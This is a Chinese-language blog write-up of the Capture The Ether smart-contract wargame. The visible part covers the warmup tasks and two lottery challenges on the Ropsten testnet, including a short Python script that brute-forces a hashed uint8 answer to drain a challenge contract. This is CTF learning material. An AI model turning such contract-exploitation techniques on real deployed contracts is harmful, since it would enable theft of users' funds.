<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="Capture The Ether Writeup">
<meta property="og:url" content="https://bestwing.me/Capture-The-Ether-writeup.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-07-546f74bc3fe57882d2e2fc01a33c86dc-ee8770.png">
<meta property="article:published_time" content="2022-05-06T16:00:00.000Z">
<meta property="article:modified_time" content="2022-05-07T11:18:45.000Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="Ethereum">
<meta property="article:tag" content="contracts">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Capture The Ether Writeup</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Capture-The-Ether-writeup.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Capture-The-Ether-writeup.html&text=Capture The Ether Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Capture-The-Ether-writeup.html&is_video=false&description=Capture The Ether Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Capture The Ether Writeup&body=Check out this article: https://bestwing.me/Capture-The-Ether-writeup.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Capture-The-Ether-writeup.html&title=Capture The Ether Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Capture-The-Ether-writeup.html&name=Capture The Ether Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Capture-The-Ether-writeup.html&t=Capture The Ether Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B3%E5%8F%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.</span> <span class="toc-text">平台地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup"><span class="toc-number">2.</span> <span class="toc-text">Warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Deploy-a-contract"><span class="toc-number">2.1.</span> <span class="toc-text">1. Deploy a contract</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-callme"><span class="toc-number">2.2.</span> <span class="toc-text">2. callme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Choose-a-nickname"><span class="toc-number">2.3.</span> <span class="toc-text">3. Choose a nickname</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lotteries"><span class="toc-number">3.</span> <span class="toc-text">Lotteries</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Guesst-the-number"><span class="toc-number">3.1.</span> <span class="toc-text">1. Guesst the number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Guess-the-secret-number"><span class="toc-number">3.2.</span> <span class="toc-text">2.  Guess the secret number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Guess-the-random-number"><span class="toc-number">3.3.</span> <span class="toc-text">3.   Guess the random number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Guess-the-new-number"><span class="toc-number">3.4.</span> <span class="toc-text">4. Guess the new number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Predict-the-future"><span class="toc-number">3.5.</span> <span class="toc-text">5.  Predict the future</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Predict-the-block-hash"><span class="toc-number">3.6.</span> <span class="toc-text">6.   Predict the block hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Math"><span class="toc-number">4.</span> <span class="toc-text">Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Token-sale"><span class="toc-number">4.1.</span> <span class="toc-text">1. Token sale</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Token-whale"><span class="toc-number">4.2.</span> <span class="toc-text">2. Token whale</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Retirement-fund"><span class="toc-number">4.3.</span> <span class="toc-text">3. Retirement fund</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Mapping"><span class="toc-number">4.4.</span> <span class="toc-text">4. Mapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Donation"><span class="toc-number">4.5.</span> <span class="toc-text">5. Donation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Fifty-years"><span class="toc-number">4.6.</span> <span class="toc-text">6. Fifty years</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Account"><span class="toc-number">5.</span> <span class="toc-text">Account</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Fuzzy-identity"><span class="toc-number">5.1.</span> <span class="toc-text">1. Fuzzy identity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Public-Key"><span class="toc-number">5.2.</span> <span class="toc-text">2. Public Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Account-Takeover"><span class="toc-number">5.3.</span> <span class="toc-text">3. Account Takeover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Miscellaneous"><span class="toc-number">6.</span> <span class="toc-text">Miscellaneous</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Assume-ownership"><span class="toc-number">6.1.</span> <span class="toc-text">1. Assume ownership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Token-bank"><span class="toc-number">6.2.</span> <span class="toc-text">2. Token bank</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Capture The Ether Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-05-06T16:00:00.000Z" itemprop="datePublished">2022-05-07</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Writeup/">Writeup</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Ethereum/" rel="tag">Ethereum</a>, <a class="tag-link-link" href="/tags/contracts/" rel="tag">contracts</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Capture the ether 是一个适合用来入门合约的 wargame 平台。我最近一直到五一花了点时间做了下一下。 另外这里感谢 @0x9k @pikachu @xhyumiracle @iczc 给我提供的帮助。</p>
<h2 id="平台地址"><a href="#平台地址" class="headerlink" title="平台地址"></a>平台地址</h2><p><a href="https://capturetheether.com/challenges/">Capture the Ether - Challenges</a></p>
<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="1-Deploy-a-contract"><a href="#1-Deploy-a-contract" class="headerlink" title="1. Deploy a contract"></a>1. Deploy a contract</h3><p><strong>题目描述：</strong></p>
<p>To complete this challenge, you need to:</p>
<ol>
<li>Install <a href="https://metamask.io/">MetaMask</a>.</li>
<li>Switch to the <strong>Ropsten test network</strong>.</li>
<li>Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a <em>faucet</em> that gives out free test ether.</li>
</ol>
<p>After you’ve done that, press the red button on the left to deploy the challenge contract.</p>
<p>You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DeployChallenge &#123;</span><br><span class="line">    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.</span><br><span class="line">    function isComplete() public pure returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题</strong></p>
<p>安装完 <code>MetaMask</code> 后， 开启测试网络。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png"></a></p>
<p>获取代币： 通常 <code>MetaMask</code> 切换到 Ropsten 测试网络后， 点击购买， 可以看到一个 <code>测试水管</code> ，可以从一个水龙头获取代币</p>
<p>水龙头： <a href="https://faucet.metamask.io/">https://faucet.metamask.io/</a> </p>
<p>但是这个水龙头我获取不到代币，最后用了 @iczc 的水龙头获取的： <a href="https://faucet.chainflag.org/">ETH Testnet Faucet (chainflag.org)</a></p>
<h3 id="2-callme"><a href="#2-callme" class="headerlink" title="2. callme"></a>2. callme</h3><p><strong>题目描述</strong></p>
<p>To complete this challenge, all you need to do is call a function.</p>
<p>The “Begin Challenge” button will deploy the following contract:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Call the function named <code>callme</code> and then click the “Check Solution” button.</p>
<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=7ou6MoKmxFQ">Call On Me</a>.</p>
<p><strong>解题</strong></p>
<p>题目要让我们部署合约后，调用 <code>callme</code> 这个函数，意思让我们尝试与部署后的合约进行交互。</p>
<ol>
<li>部署题目合约， 得到一个 challenge 地址</li>
</ol>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-550eea2a0bea461439192544c34f6771-5ebe66.png"></a><br>2. 安装 remix-ide 编辑器，或者使用在线的： <a href="https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=soljson-v0.4.26+commit.4563c3fc.js&language=Solidity">Remix - Ethereum IDE</a></p>
<p>部署题目合约用来交互调用 challenge 的 callme 函数</p>
<p>部署方法如下</p>
<ul>
<li><p>在文件编辑器中， contracts 文件中新建 <code>callme.sol</code>， 内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>转到编译界面，设置编译器版本，然后选择下方的编译</p>
</li>
</ul>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-f4a985f504ea256b93d83a333dd60b8f-4b452a.png"></a></p>
<ul>
<li>转到部署界面</li>
</ul>
<p>选择 <code>injected web3</code> , 点击部署， 填入 <code>At address</code> , 然后就能调用对应公开方法</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-8793ce48ab30802bd5763d0217f0041d-4251d5.png"></a></p>
<p>这里有一个需要注意的地方，调用 callme 的时候记得看清楚调用的合约地址， 像图中这个地方其实调用的方法不对。应该在下面还有一个callme</p>
<h3 id="3-Choose-a-nickname"><a href="#3-Choose-a-nickname" class="headerlink" title="3. Choose a nickname"></a>3. Choose a nickname</h3><p><strong>题目描述</strong></p>
<p>WARMUP: 200 POINTS</p>
<p><a href="https://capturetheether.com/challenges/warmup/nickname/#">Begin Challenge</a></p>
<p>It’s time to set your Capture the Ether nickname! This nickname is how you’ll show up on the <a href="https://capturetheether.com/leaderboard/">leaderboard</a>.</p>
<p>The <code>CaptureTheEther</code> smart contract keeps track of a nickname for every player. To complete this challenge, set your nickname to a non-empty string. The smart contract is running on the Ropsten test network at the address <code>0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee</code>.</p>
<p>Here’s the code for this challenge:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Relevant part of the CaptureTheEther contract.</span><br><span class="line">contract CaptureTheEther &#123;</span><br><span class="line">    mapping (address &#x3D;&gt; bytes32) public nicknameOf;</span><br><span class="line"></span><br><span class="line">    function setNickname(bytes32 nickname) public &#123;</span><br><span class="line">        nicknameOf[msg.sender] &#x3D; nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Challenge contract. You don&#39;t need to do anything with this; it just verifies</span><br><span class="line">&#x2F;&#x2F; that you set a nickname for yourself.</span><br><span class="line">contract NicknameChallenge &#123;</span><br><span class="line">    CaptureTheEther cte &#x3D; CaptureTheEther(msg.sender);</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Your address gets passed in as a constructor parameter.</span><br><span class="line">    function NicknameChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check that the first character is not null.</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return cte.nicknameOf(player)[0] !&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9YZXPs8uAB0">Say My Name</a>.</p>
<p><strong>解题</strong></p>
<p>题目要求我们设置我们的 <code>nickname</code>, 调用 <code>setNickName</code> 方法即可， 但是这里函数传入的类型为 <code>bytes32</code> , 所以我们需要将我们的我们的 nickname 转为 <code>bytes32</code> ， 我这里使用在线的网站进行转换</p>
<p><a href="https://www.testcoins.io/str-bytes32">String To Bytes32 Online Converter (testcoins.io)</a></p>
<p>转完之后， 在 remix-ide 中调用 <code>setNickName</code> 方法</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-21fdb0e204edd8a0f6cd58478bfe25c0-66ee4f.png"></a></p>
<h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="1-Guesst-the-number"><a href="#1-Guesst-the-number" class="headerlink" title="1. Guesst the number"></a>1. Guesst the number</h3><p><strong>题目描述</strong></p>
<p>I’m thinking of a number. All you have to do is guess it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer &#x3D; 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=jgJPSjt1L1M">Guessing Games</a>.</p>
<p><strong>解题</strong></p>
<p>让我猜 <code>answer</code> 的值是多少， 如果猜对则 <code>tansfer</code> , 代码里的 <code>answer</code> 是写死的 42 ，那么猜 42 即可 。然后代码中要求 <code>msg.value</code>  要求要一个 <code>1 ether</code></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png"></a></p>
<h3 id="2-Guess-the-secret-number"><a href="#2-Guess-the-secret-number" class="headerlink" title="2.  Guess the secret number"></a>2.  Guess the secret number</h3><p><strong>题目描述</strong>：</p>
<p>Putting the answer in the code makes things a little too easy.</p>
<p>This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=uc6f_2nPSX8">Mr. Roboto</a>.</p>
<p><strong>解题</strong></p>
<p>要求 <code>keccak256(n) == 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</code>, n 为用户输入，且 <code>msg.value == 1 ether</code></p>
<p>n 的值为 uint 8 , 则范围为 0 - 256， 写一个脚本爆破下，爆破脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> Web3.keccak(i).hex() == <span class="string">&#x27;0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>        print(i)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">break</span></span><br><span class="line"><span class="number">170</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>solidity 脚本参考 @0x9k PDF</p>
